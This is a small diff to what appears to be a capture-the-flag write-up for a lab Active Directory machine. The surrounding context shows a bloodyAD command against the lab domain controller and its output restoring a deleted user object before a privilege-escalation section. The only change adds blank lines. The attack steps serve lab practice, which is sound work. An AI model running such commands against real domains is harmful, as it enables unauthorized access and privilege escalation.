@@ -512,6 +512,8 @@ bloodyAD -H DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_lda
 Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
 [+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
 ```
+
+
 ---
 ## Privilege Escalation
 
